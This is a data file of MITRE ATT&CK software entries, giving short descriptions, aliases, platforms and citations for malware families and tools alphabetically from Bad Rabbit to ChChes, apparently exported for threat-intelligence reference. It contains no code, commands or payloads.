{"ID":"S0606","name":"Bad Rabbit","description":"[Bad Rabbit](https://attack.mitre.org/software/S0606) is a self-propagating ransomware that affected the Ukrainian transportation sector in 2017. [Bad Rabbit](https://attack.mitre.org/software/S0606) has also targeted organizations and consumers in Russia. (Citation: Secure List Bad Rabbit)(Citation: ESET Bad Rabbit)(Citation: Dragos IT ICS Ransomware) ","url":"https://attack.mitre.org/software/S0606","created":"09 February 2021","last modified":"12 October 2022","version":"1.0","contributors":null,"platforms":"Windows","aliases":"Win32/Diskcoder.D","type":"malware","relationship citations":"(Citation: Secureworks IRON VIKING ),,(Citation: Secure List Bad Rabbit),(Citation: ESET Bad Rabbit)"}
{"ID":"S0337","name":"BadPatch","description":"[BadPatch](https://attack.mitre.org/software/S0337) is a Windows Trojan that was used in a Gaza Hackers-linked campaign.(Citation: Unit 42 BadPatch Oct 2017)","url":"https://attack.mitre.org/software/S0337","created":"29 January 2019","last modified":"17 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Unit 42 BadPatch Oct 2017)"}
{"ID":"S0234","name":"Bandook","description":"[Bandook](https://attack.mitre.org/software/S0234) is a commercially available RAT, written in Delphi and C++, that has been available since at least 2007. It has been used against government, financial, energy, healthcare, education, IT, and legal organizations in the US, South America, Europe, and Southeast Asia. [Bandook](https://attack.mitre.org/software/S0234) has been used by [Dark Caracal](https://attack.mitre.org/groups/G0070), as well as in a separate campaign referred to as \"Operation Manul\".(Citation: EFF Manul Aug 2016)(Citation: Lookout Dark Caracal Jan 2018)(Citation: CheckPoint Bandook Nov 2020)","url":"https://attack.mitre.org/software/S0234","created":"17 October 2018","last modified":"11 October 2021","version":"2.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Lookout Dark Caracal Jan 2018),(Citation: CheckPoint Bandook Nov 2020),,(Citation: CheckPoint Bandook Nov 2020),(Citation: BH Manul Aug 2016),(Citation: EFF Manul Aug 2016),(Citation: Lookout Dark Caracal Jan 2018)"}
{"ID":"S0239","name":"Bankshot","description":"[Bankshot](https://attack.mitre.org/software/S0239) is a remote access tool (RAT) that was first reported by the Department of Homeland Security in December of 2017. In 2018, [Lazarus Group](https://attack.mitre.org/groups/G0032) used the [Bankshot](https://attack.mitre.org/software/S0239) implant in attacks against the Turkish financial sector. (Citation: McAfee Bankshot)","url":"https://attack.mitre.org/software/S0239","created":"17 October 2018","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":"Trojan Manuscript","type":"malware","relationship citations":"(Citation: McAfee Bankshot),,(Citation: McAfee Bankshot),(Citation: US-CERT Bankshot Dec 2017)"}
{"ID":"S0534","name":"Bazar","description":"[Bazar](https://attack.mitre.org/software/S0534) is a downloader and backdoor that has been used since at least April 2020, with infections primarily against professional services, healthcare, manufacturing, IT, logistics and travel companies across the US and Europe. [Bazar](https://attack.mitre.org/software/S0534) reportedly has ties to [TrickBot](https://attack.mitre.org/software/S0266) campaigns and can be used to deploy additional malware, including ransomware, and to steal sensitive data.(Citation: Cybereason Bazar July 2020)","url":"https://attack.mitre.org/software/S0534","created":"18 November 2020","last modified":"29 September 2022","version":"1.2","contributors":"Cybereason Nocturnus, @nocturnus","platforms":"Windows","aliases":"KEGTAP, Team9","type":"malware","relationship citations":"(Citation: Google EXOTIC LILY March 2022),(Citation: CrowdStrike Wizard Spider October 2020),(Citation: DFIR Conti Bazar Nov 2021),(Citation: NCC Group Team9 June 2020),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Cybereason Bazar July 2020),(Citation: Zscaler Bazar September 2020),(Citation: CrowdStrike Wizard Spider October 2020),(Citation: DFIR Ryuk's Return October 2020)"}
{"ID":"S0574","name":"BendyBear","description":"[BendyBear](https://attack.mitre.org/software/S0574) is an x64 shellcode for a stage-zero implant designed to download malware from a C2 server. First discovered in August 2020, [BendyBear](https://attack.mitre.org/software/S0574) shares a variety of features with [Waterbear](https://attack.mitre.org/software/S0579), malware previously attributed to the Chinese cyber espionage group [BlackTech](https://attack.mitre.org/groups/G0098).(Citation: Unit42 BendyBear Feb 2021)","url":"https://attack.mitre.org/software/S0574","created":"16 February 2021","last modified":"21 April 2021","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Unit42 BendyBear Feb 2021)"}
{"ID":"S0268","name":"Bisonal","description":"[Bisonal](https://attack.mitre.org/software/S0268) is a remote access tool (RAT) that has been used by [Tonto Team](https://attack.mitre.org/groups/G0131) against public and private sector organizations in Russia, South Korea, and Japan since at least December 2010.(Citation: Unit 42 Bisonal July 2018)(Citation: Talos Bisonal Mar 2020)","url":"https://attack.mitre.org/software/S0268","created":"17 October 2018","last modified":"18 April 2022","version":"2.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Kaspersky CactusPete Aug 2020),(Citation: Secureworks BRONZE HUNTLEY ),(Citation: Talos Bisonal Mar 2020),,(Citation: Unit 42 Bisonal July 2018),(Citation: Kaspersky CactusPete Aug 2020),(Citation: Talos Bisonal Mar 2020)"}
{"ID":"S0570","name":"BitPaymer","description":"[BitPaymer](https://attack.mitre.org/software/S0570) is a ransomware variant first observed in August 2017 targeting hospitals in the U.K. [BitPaymer](https://attack.mitre.org/software/S0570) uses a unique encryption key, ransom note, and contact information for each operation. [BitPaymer](https://attack.mitre.org/software/S0570) has several indicators suggesting overlap with the [Dridex](https://attack.mitre.org/software/S0384) malware and is often delivered via [Dridex](https://attack.mitre.org/software/S0384).(Citation: Crowdstrike Indrik November 2018)","url":"https://attack.mitre.org/software/S0570","created":"08 February 2021","last modified":"26 April 2021","version":"1.0","contributors":null,"platforms":"Windows","aliases":"FriedEx, wp_encrypt","type":"malware","relationship citations":"(Citation: Crowdstrike EvilCorp March 2021),(Citation: Crowdstrike Indrik November 2018),,(Citation: Crowdstrike Indrik November 2018)"}
{"ID":"S1070","name":"Black Basta","description":"[Black Basta](https://attack.mitre.org/software/S1070) is ransomware written in C++ that has been offered within the ransomware-as-a-service (RaaS) model since at least April 2022; there are variants that target Windows and VMWare ESXi servers. [Black Basta](https://attack.mitre.org/software/S1070) operations have included the double extortion technique where in addition to demanding ransom for decrypting the files of targeted organizations the cyber actors also threaten to post sensitive information to a leak site if the ransom is not paid. [Black Basta](https://attack.mitre.org/software/S1070) affiliates have targeted multiple high-value organizations, with the largest number of victims based in the U.S. Based on similarities in TTPs, leak sites, payment sites, and negotiation tactics, security researchers assess the [Black Basta](https://attack.mitre.org/software/S1070) RaaS operators could include current or former members of the [Conti](https://attack.mitre.org/software/S0575) group.(Citation: Palo Alto Networks Black Basta August 2022)(Citation: Deep Instinct Black Basta August 2022)(Citation: Minerva Labs Black Basta May 2022)(Citation: Avertium Black Basta June 2022)(Citation: NCC Group Black Basta June 2022)(Citation: Cyble Black Basta May 2022)","url":"https://attack.mitre.org/software/S1070","created":"08 March 2023","last modified":"01 May 2023","version":"1.0","contributors":"Daniyal Naeem, BT Security; Inna Danilevich, U.S. Bank; Mathieu Hinse","platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Minerva Labs Black Basta May 2022),(Citation: Deep Instinct Black Basta August 2022),(Citation: Palo Alto Networks Black Basta August 2022),(Citation: Trend Micro Black Basta Spotlight September 2022),(Citation: Avertium Black Basta June 2022),(Citation: Cyble Black Basta May 2022),(Citation: Uptycs Black Basta ESXi June 2022),(Citation: Check Point Black Basta October 2022),(Citation: BlackBerry Black Basta May 2022),(Citation: Trend Micro Black Basta May 2022),(Citation: NCC Group Black Basta June 2022)"}
{"ID":"S1068","name":"BlackCat","description":"[BlackCat](https://attack.mitre.org/software/S1068) is ransomware written in Rust that has been offered via the Ransomware-as-a-Service (RaaS) model. First observed November 2021, [BlackCat](https://attack.mitre.org/software/S1068) has been used to target multiple sectors and organizations in various countries and regions in Africa, the Americas, Asia, Australia, and Europe.(Citation: Microsoft BlackCat Jun 2022)(Citation: Sophos BlackCat Jul 2022)(Citation: ACSC BlackCat Apr 2022)","url":"https://attack.mitre.org/software/S1068","created":"28 February 2023","last modified":"17 April 2023","version":"1.0","contributors":"Hiroki Nagahama, NEC Corporation; Josh Arenas, Trustwave Spiderlabs; Manikantan Srinivasan, NEC Corporation India; Pooja Natarajan, NEC Corporation India","platforms":"Linux, Windows","aliases":"ALPHV, Noberus","type":"malware","relationship citations":",,(Citation: Sophos BlackCat Jul 2022),(Citation: Microsoft BlackCat Jun 2022)"}
{"ID":"S0089","name":"BlackEnergy","description":"[BlackEnergy](https://attack.mitre.org/software/S0089) is a malware toolkit that has been used by both criminal and APT actors. It dates back to at least 2007 and was originally designed to create botnets for use in conducting Distributed Denial of Service (DDoS) attacks, but its use has evolved to support various plug-ins. It is well known for being used during the confrontation between Georgia and Russia in 2008, as well as in targeting Ukrainian institutions. Variants include BlackEnergy 2 and BlackEnergy 3. (Citation: F-Secure BlackEnergy 2014)","url":"https://attack.mitre.org/software/S0089","created":"31 May 2017","last modified":"12 October 2022","version":"1.3","contributors":null,"platforms":"Windows","aliases":"Black Energy","type":"malware","relationship citations":"(Citation: F-Secure BlackEnergy 2014),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Secureworks IRON VIKING ),(Citation: iSIGHT Sandworm 2014),(Citation: UK NCSC Olympic Attacks October 2020),,(Citation: Securelist BlackEnergy Nov 2014),(Citation: F-Secure BlackEnergy 2014),(Citation: ESEST Black Energy Jan 2016),(Citation: ESET BlackEnergy Jan 2016),(Citation: Securelist BlackEnergy Feb 2015)"}
{"ID":"S0564","name":"BlackMould","description":"[BlackMould](https://attack.mitre.org/software/S0564) is a web shell based on [China Chopper](https://attack.mitre.org/software/S0020) for servers running Microsoft IIS. First reported in December 2019, it has been used in malicious campaigns by [GALLIUM](https://attack.mitre.org/groups/G0093) against telecommunication providers.(Citation: Microsoft GALLIUM December 2019)","url":"https://attack.mitre.org/software/S0564","created":"14 January 2021","last modified":"23 March 2021","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Microsoft GALLIUM December 2019),,(Citation: Microsoft GALLIUM December 2019)"}
{"ID":"S0521","name":"BloodHound","description":"[BloodHound](https://attack.mitre.org/software/S0521) is an Active Directory (AD) reconnaissance tool that can reveal hidden relationships and identify attack paths within an AD environment.(Citation: GitHub Bloodhound)(Citation: CrowdStrike BloodHound April 2018)(Citation: FoxIT Wocao December 2019)","url":"https://attack.mitre.org/software/S0521","created":"28 October 2020","last modified":"16 February 2023","version":"1.4","contributors":null,"platforms":"Windows","aliases":null,"type":"tool","relationship citations":"(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: Sophos New Ryuk Attack October 2020),(Citation: ESET T3 Threat Report 2021),(Citation: Cycraft Chimera April 2020),(Citation: NCC Group TA505),(Citation: FoxIT Wocao December 2019),(Citation: Trend Micro Black Basta October 2022),(Citation: GitHub Bloodhound),(Citation: CrowdStrike BloodHound April 2018)"}
{"ID":"S0486","name":"Bonadan","description":"[Bonadan](https://attack.mitre.org/software/S0486) is a malicious version of OpenSSH which acts as a custom backdoor. [Bonadan](https://attack.mitre.org/software/S0486) has been active since at least 2018 and combines a new cryptocurrency-mining module with the same credential-stealing module used by the Onderon family of backdoors.(Citation: ESET ForSSHe December 2018)","url":"https://attack.mitre.org/software/S0486","created":"16 July 2020","last modified":"10 August 2020","version":"1.0","contributors":null,"platforms":"Linux","aliases":null,"type":"malware","relationship citations":",,(Citation: ESET ForSSHe December 2018)"}
{"ID":"S0635","name":"BoomBox","description":"[BoomBox](https://attack.mitre.org/software/S0635) is a downloader responsible for executing next stage components that has been used by [APT29](https://attack.mitre.org/groups/G0016) since at least 2021.(Citation: MSTIC Nobelium Toolset May 2021)","url":"https://attack.mitre.org/software/S0635","created":"03 August 2021","last modified":"18 January 2022","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: MSTIC Nobelium Toolset May 2021),,(Citation: MSTIC Nobelium Toolset May 2021)"}
{"ID":"S0651","name":"BoxCaon","description":"[BoxCaon](https://attack.mitre.org/software/S0651) is a Windows backdoor that was used by [IndigoZebra](https://attack.mitre.org/groups/G0136) in a 2021 spearphishing campaign against Afghan government officials. [BoxCaon](https://attack.mitre.org/software/S0651)'s name stems from similarities shared with the malware family [xCaon](https://attack.mitre.org/software/S0653).(Citation: Checkpoint IndigoZebra July 2021)","url":"https://attack.mitre.org/software/S0651","created":"27 September 2021","last modified":"16 October 2021","version":"1.0","contributors":"Manikantan Srinivasan, NEC Corporation India; Pooja Natarajan, NEC Corporation India; Yoshihiro Kori, NEC Corporation","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Checkpoint IndigoZebra July 2021),,(Citation: Checkpoint IndigoZebra July 2021)"}
{"ID":"S0252","name":"Brave Prince","description":"[Brave Prince](https://attack.mitre.org/software/S0252) is a Korean-language implant that was first observed in the wild in December 2017. It contains similar code and behavior to [Gold Dragon](https://attack.mitre.org/software/S0249), and was seen along with [Gold Dragon](https://attack.mitre.org/software/S0249) and [RunningRAT](https://attack.mitre.org/software/S0253) in operations surrounding the 2018 Pyeongchang Winter Olympics. (Citation: McAfee Gold Dragon)","url":"https://attack.mitre.org/software/S0252","created":"17 October 2018","last modified":"11 April 2022","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Talos Kimsuky Nov 2021),,(Citation: McAfee Gold Dragon)"}
{"ID":"S0204","name":"Briba","description":"[Briba](https://attack.mitre.org/software/S0204) is a trojan used by [Elderwood](https://attack.mitre.org/groups/G0066) to open a backdoor and download files on to compromised hosts. (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Briba May 2012)","url":"https://attack.mitre.org/software/S0204","created":"18 April 2018","last modified":"09 February 2021","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Symantec Elderwood Sept 2012),,(Citation: Symantec Briba May 2012)"}
{"ID":"S1063","name":"Brute Ratel C4","description":"[Brute Ratel C4](https://attack.mitre.org/software/S1063) is a commercial red-teaming and adversarial attack simulation tool that first appeared in December 2020. [Brute Ratel C4](https://attack.mitre.org/software/S1063) was specifically designed to avoid detection by endpoint detection and response (EDR) and antivirus (AV) capabilities, and deploys agents called badgers to enable arbitrary command execution for lateral movement, privilege escalation, and persistence. In September 2022, a cracked version of [Brute Ratel C4](https://attack.mitre.org/software/S1063) was leaked in the cybercriminal underground, leading to its use by threat actors.(Citation: Dark Vortex Brute Ratel C4)(Citation: Palo Alto Brute Ratel July 2022)(Citation: MDSec Brute Ratel August 2022)(Citation: SANS Brute Ratel October 2022)(Citation: Trend Micro Black Basta October 2022)","url":"https://attack.mitre.org/software/S1063","created":"07 February 2023","last modified":"17 April 2023","version":"1.0","contributors":"Daniel Acevedo, @darmad0, ARMADO; Sittikorn Sangrattanapitak","platforms":"Windows","aliases":"BRc4","type":"tool","relationship citations":",,(Citation: Trend Micro Black Basta October 2022),(Citation: Palo Alto Brute Ratel July 2022),(Citation: Dark Vortex Brute Ratel C4),(Citation: MDSec Brute Ratel August 2022)"}
{"ID":"S1039","name":"Bumblebee","description":"[Bumblebee](https://attack.mitre.org/software/S1039) is a custom loader written in C++ that has been used by multiple threat actors, including possible initial access brokers, to download and execute additional payloads since at least March 2022. [Bumblebee](https://attack.mitre.org/software/S1039) has been linked to ransomware operations including [Conti](https://attack.mitre.org/software/S0575), Quantum, and Mountlocker and derived its name from the appearance of \"bumblebee\" in the user-agent.(Citation: Google EXOTIC LILY March 2022)(Citation: Proofpoint Bumblebee April 2022)(Citation: Symantec Bumblebee June 2022)\n","url":"https://attack.mitre.org/software/S1039","created":"19 August 2022","last modified":"21 October 2022","version":"1.0","contributors":"Phill Taylor, BT Security","platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Google EXOTIC LILY March 2022),,(Citation: Cybereason Bumblebee August 2022),(Citation: Medium Ali Salem Bumblebee April 2022),(Citation: Symantec Bumblebee June 2022),(Citation: Proofpoint Bumblebee April 2022),(Citation: Google EXOTIC LILY March 2022)"}
{"ID":"S0482","name":"Bundlore","description":"[Bundlore](https://attack.mitre.org/software/S0482) is adware written for macOS that has been in use since at least 2015. Though categorized as adware, [Bundlore](https://attack.mitre.org/software/S0482) has many features associated with more traditional backdoors.(Citation: MacKeeper Bundlore Apr 2019)","url":"https://attack.mitre.org/software/S0482","created":"01 July 2020","last modified":"10 February 2022","version":"1.1","contributors":null,"platforms":"macOS","aliases":"OSX.Bundlore","type":"malware","relationship citations":",,(Citation: MacKeeper Bundlore Apr 2019),(Citation: 20 macOS Common Tools and Techniques)"}
{"ID":"S0025","name":"CALENDAR","description":"[CALENDAR](https://attack.mitre.org/software/S0025) is malware used by [APT1](https://attack.mitre.org/groups/G0006) that mimics legitimate Gmail Calendar traffic. (Citation: Mandiant APT1)","url":"https://attack.mitre.org/software/S0025","created":"31 May 2017","last modified":"30 March 2020","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Mandiant APT1),,(Citation: Mandiant APT1 Appendix),(Citation: Mandiant APT1)"}
{"ID":"S0465","name":"CARROTBALL","description":"[CARROTBALL](https://attack.mitre.org/software/S0465) is an FTP downloader utility that has been in use since at least 2019. [CARROTBALL](https://attack.mitre.org/software/S0465) has been used as a downloader to install [SYSCON](https://attack.mitre.org/software/S0464).(Citation: Unit 42 CARROTBAT January 2020)","url":"https://attack.mitre.org/software/S0465","created":"02 June 2020","last modified":"10 June 2020","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"tool","relationship citations":",,(Citation: Unit 42 CARROTBAT January 2020)"}
{"ID":"S0462","name":"CARROTBAT","description":"[CARROTBAT](https://attack.mitre.org/software/S0462) is a customized dropper that has been in use since at least 2017. [CARROTBAT](https://attack.mitre.org/software/S0462) has been used to install [SYSCON](https://attack.mitre.org/software/S0464) and has infrastructure overlap with [KONNI](https://attack.mitre.org/software/S0356).(Citation: Unit 42 CARROTBAT November 2018)(Citation: Unit 42 CARROTBAT January 2020)","url":"https://attack.mitre.org/software/S0462","created":"02 June 2020","last modified":"22 March 2023","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Unit 42 CARROTBAT January 2020),(Citation: Unit 42 CARROTBAT November 2018)"}
{"ID":"S0222","name":"CCBkdr","description":"[CCBkdr](https://attack.mitre.org/software/S0222) is malware that was injected into a signed version of CCleaner and distributed from CCleaner's distribution website. (Citation: Talos CCleanup 2017) (Citation: Intezer Aurora Sept 2017)","url":"https://attack.mitre.org/software/S0222","created":"18 April 2018","last modified":"20 March 2020","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Intezer Aurora Sept 2017),(Citation: Talos CCleanup 2017),(Citation: Avast CCleaner3 2018)"}
{"ID":"S0023","name":"CHOPSTICK","description":"[CHOPSTICK](https://attack.mitre.org/software/S0023) is a malware family of modular backdoors used by [APT28](https://attack.mitre.org/groups/G0007). It has been used since at least 2012 and is usually dropped on victims as second-stage malware, though it has been used as first-stage malware in several cases. It has both Windows and Linux variants. (Citation: FireEye APT28) (Citation: ESET Sednit Part 2) (Citation: FireEye APT28 January 2017) (Citation: DOJ GRU Indictment Jul 2018) It is tracked separately from the [X-Agent for Android](https://attack.mitre.org/software/S0314).","url":"https://attack.mitre.org/software/S0023","created":"31 May 2017","last modified":"26 March 2023","version":"2.3","contributors":"Richard Gold, Digital Shadows","platforms":"Linux, Windows","aliases":"Backdoor.SofacyX, SPLM, X-Agent, Xagent, webhp","type":"malware","relationship citations":"(Citation: Secureworks IRON TWILIGHT Active Measures March 2017),(Citation: Securelist Sofacy Feb 2018),(Citation: Kaspersky Sofacy),(Citation: FireEye APT28),,(Citation: ESET Sednit Part 2),(Citation: FireEye APT28),(Citation: Secureworks IRON TWILIGHT Active Measures March 2017),(Citation: DOJ GRU Indictment Jul 2018),(Citation: Microsoft SIR Vol 19),(Citation: Crowdstrike DNC June 2016),(Citation: ESET Sednit 2017 Activity)"}
{"ID":"S0212","name":"CORALDECK","description":"[CORALDECK](https://attack.mitre.org/software/S0212) is an exfiltration tool used by [APT37](https://attack.mitre.org/groups/G0067). (Citation: FireEye APT37 Feb 2018)","url":"https://attack.mitre.org/software/S0212","created":"18 April 2018","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: FireEye APT37 Feb 2018),,(Citation: FireEye APT37 Feb 2018)"}
{"ID":"S0137","name":"CORESHELL","description":"[CORESHELL](https://attack.mitre.org/software/S0137) is a downloader used by [APT28](https://attack.mitre.org/groups/G0007). The older versions of this malware are known as SOURFACE and newer versions as CORESHELL.(Citation: FireEye APT28) (Citation: FireEye APT28 January 2017)","url":"https://attack.mitre.org/software/S0137","created":"31 May 2017","last modified":"26 March 2023","version":"2.1","contributors":null,"platforms":"Windows","aliases":"SOURFACE, Sofacy","type":"malware","relationship citations":"(Citation: Secureworks IRON TWILIGHT Active Measures March 2017),(Citation: FireEye APT28),,(Citation: Microsoft SIR Vol 19),(Citation: FireEye APT28)"}
{"ID":"S0527","name":"CSPY Downloader","description":"[CSPY Downloader](https://attack.mitre.org/software/S0527) is a tool designed to evade analysis and download additional payloads used by [Kimsuky](https://attack.mitre.org/groups/G0094).(Citation: Cybereason Kimsuky November 2020)","url":"https://attack.mitre.org/software/S0527","created":"09 November 2020","last modified":"18 October 2022","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"tool","relationship citations":"(Citation: Cybereason Kimsuky November 2020),,(Citation: Cybereason Kimsuky November 2020)"}
{"ID":"S0119","name":"Cachedump","description":"[Cachedump](https://attack.mitre.org/software/S0119) is a publicly-available tool that program extracts cached password hashes from a system’s registry. (Citation: Mandiant APT1)","url":"https://attack.mitre.org/software/S0119","created":"31 May 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"tool","relationship citations":"(Citation: Mandiant APT1),,(Citation: Mandiant APT1)"}
{"ID":"S0693","name":"CaddyWiper","description":"[CaddyWiper](https://attack.mitre.org/software/S0693) is a destructive data wiper that has been used in attacks against organizations in Ukraine since at least March 2022.(Citation: ESET CaddyWiper March 2022)(Citation: Cisco CaddyWiper March 2022)","url":"https://attack.mitre.org/software/S0693","created":"23 March 2022","last modified":"11 April 2022","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Cisco CaddyWiper March 2022),(Citation: ESET CaddyWiper March 2022),(Citation: Malwarebytes IssacWiper CaddyWiper March 2022 )"}
{"ID":"S0454","name":"Cadelspy","description":"[Cadelspy](https://attack.mitre.org/software/S0454) is a backdoor that has been used by [APT39](https://attack.mitre.org/groups/G0087).(Citation: Symantec Chafer Dec 2015)","url":"https://attack.mitre.org/software/S0454","created":"22 May 2020","last modified":"29 May 2020","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Symantec Chafer Dec 2015),,(Citation: Symantec Chafer Dec 2015)"}
{"ID":"S0274","name":"Calisto","description":"[Calisto](https://attack.mitre.org/software/S0274) is a macOS Trojan that opens a backdoor on the compromised machine. [Calisto](https://attack.mitre.org/software/S0274) is believed to have first been developed in 2016. (Citation: Securelist Calisto July 2018) (Citation: Symantec Calisto July 2018)","url":"https://attack.mitre.org/software/S0274","created":"17 October 2018","last modified":"30 March 2020","version":"1.1","contributors":"Cody Thomas, SpecterOps","platforms":"macOS","aliases":null,"type":"malware","relationship citations":",,(Citation: Securelist Calisto July 2018),(Citation: Symantec Calisto July 2018)"}
{"ID":"S0077","name":"CallMe","description":"[CallMe](https://attack.mitre.org/software/S0077) is a Trojan designed to run on Apple OSX. It is based on a publicly available tool called Tiny SHell. (Citation: Scarlet Mimic Jan 2016)","url":"https://attack.mitre.org/software/S0077","created":"31 May 2017","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"macOS","aliases":null,"type":"malware","relationship citations":"(Citation: Scarlet Mimic Jan 2016),,(Citation: Scarlet Mimic Jan 2016)"}
{"ID":"S0351","name":"Cannon","description":"[Cannon](https://attack.mitre.org/software/S0351) is a Trojan with variants written in C# and Delphi. It was first observed in April 2018. (Citation: Unit42 Cannon Nov 2018)(Citation: Unit42 Sofacy Dec 2018)","url":"https://attack.mitre.org/software/S0351","created":"30 January 2019","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Unit42 Cannon Nov 2018),(Citation: Unit42 Sofacy Dec 2018),,(Citation: Unit42 Cannon Nov 2018),(Citation: Unit42 Sofacy Dec 2018)"}
{"ID":"S0030","name":"Carbanak","description":"[Carbanak](https://attack.mitre.org/software/S0030) is a full-featured, remote backdoor used by a group of the same name ([Carbanak](https://attack.mitre.org/groups/G0008)). It is intended for espionage, data exfiltration, and providing remote access to infected machines. (Citation: Kaspersky Carbanak) (Citation: FireEye CARBANAK June 2017)","url":"https://attack.mitre.org/software/S0030","created":"31 May 2017","last modified":"01 April 2021","version":"1.1","contributors":null,"platforms":"Windows","aliases":"Anunak","type":"malware","relationship citations":"(Citation: CrowdStrike Carbon Spider August 2021),(Citation: Kaspersky Carbanak),(Citation: DOJ FIN7 Aug 2018),(Citation: FBI Flash FIN7 USB),(Citation: FireEye FIN7 Aug 2018),(Citation: FireEye FIN7 March 2017),(Citation: IBM Ransomware Trends September 2020),,(Citation: FireEye CARBANAK June 2017),(Citation: Kaspersky Carbanak)"}
{"ID":"S0484","name":"Carberp","description":"[Carberp](https://attack.mitre.org/software/S0484) is a credential and information stealing malware that has been active since at least 2009. [Carberp](https://attack.mitre.org/software/S0484)'s source code was leaked online in 2013, and subsequently used as the foundation for the [Carbanak](https://attack.mitre.org/software/S0030) backdoor.(Citation: Trend Micro Carberp February 2014)(Citation: KasperskyCarbanak)(Citation: RSA Carbanak November 2017)","url":"https://attack.mitre.org/software/S0484","created":"15 July 2020","last modified":"25 August 2021","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: Trusteer Carberp October 2010),(Citation: Prevx Carberp March 2011),(Citation: ESET Carberp March 2012)"}
{"ID":"S0335","name":"Carbon","description":"[Carbon](https://attack.mitre.org/software/S0335) is a sophisticated, second-stage backdoor and framework that can be used to steal sensitive information from victims. [Carbon](https://attack.mitre.org/software/S0335) has been selectively used by [Turla](https://attack.mitre.org/groups/G0010) to target government and foreign affairs-related organizations in Central Asia.(Citation: ESET Carbon Mar 2017)(Citation: Securelist Turla Oct 2018)","url":"https://attack.mitre.org/software/S0335","created":"29 January 2019","last modified":"25 April 2021","version":"1.2","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: ESET Carbon Mar 2017),(Citation: Secureworks IRON HUNTER Profile),,(Citation: GovCERT Carbon May 2016),(Citation: ESET Carbon Mar 2017),(Citation: Accenture HyperStack October 2020)"}
{"ID":"S0348","name":"Cardinal RAT","description":"[Cardinal RAT](https://attack.mitre.org/software/S0348) is a potentially low volume remote access trojan (RAT) observed since December 2015. [Cardinal RAT](https://attack.mitre.org/software/S0348) is notable for its unique utilization of uncompiled C# source code and the Microsoft Windows built-in csc.exe compiler.(Citation: PaloAlto CardinalRat Apr 2017)","url":"https://attack.mitre.org/software/S0348","created":"30 January 2019","last modified":"30 March 2020","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":",,(Citation: PaloAlto CardinalRat Apr 2017)"}
{"ID":"S0261","name":"Catchamas","description":"[Catchamas](https://attack.mitre.org/software/S0261) is a Windows Trojan that steals information from compromised systems. (Citation: Symantec Catchamas April 2018)","url":"https://attack.mitre.org/software/S0261","created":"17 October 2018","last modified":"09 February 2021","version":"1.1","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: Symantec Thrip June 2018),,(Citation: Symantec Catchamas April 2018)"}
{"ID":"S0572","name":"Caterpillar WebShell","description":"[Caterpillar WebShell](https://attack.mitre.org/software/S0572) is a self-developed Web Shell tool created by the group [Volatile Cedar](https://attack.mitre.org/groups/G0123).(Citation: ClearSky Lebanese Cedar Jan 2021) ","url":"https://attack.mitre.org/software/S0572","created":"10 February 2021","last modified":"27 April 2021","version":"1.0","contributors":null,"platforms":"Windows","aliases":null,"type":"malware","relationship citations":"(Citation: CheckPoint Volatile Cedar March 2015),(Citation: ClearSky Lebanese Cedar Jan 2021),,(Citation: ClearSky Lebanese Cedar Jan 2021)"}
{"ID":"S0144","name":"ChChes","description":"[ChChes](https://attack.mitre.org/software/S0144) is a Trojan that appears to be used exclusively by [menuPass](https://attack.mitre.org/groups/G0045). It was used to target Japanese organizations in 2016. Its lack of persistence methods suggests it may be intended as a first-stage tool. (Citation: Palo Alto menuPass Feb 2017) (Citation: JPCERT ChChes Feb 2017) (Citation: PWC Cloud Hopper Technical Annex April 2017)","url":"https://attack.mitre.org/software/S0144","created":"31 May 2017","last modified":"23 March 2023","version":"1.1","contributors":null,"platforms":"Windows","aliases":"HAYMAKER, Scorpion","type":"malware","relationship citations":"(Citation: PWC Cloud Hopper Technical Annex April 2017),,(Citation: JPCERT ChChes Feb 2017),(Citation: Palo Alto menuPass Feb 2017),(Citation: FireEye APT10 April 2017),(Citation: PWC Cloud Hopper Technical Annex April 2017)"}
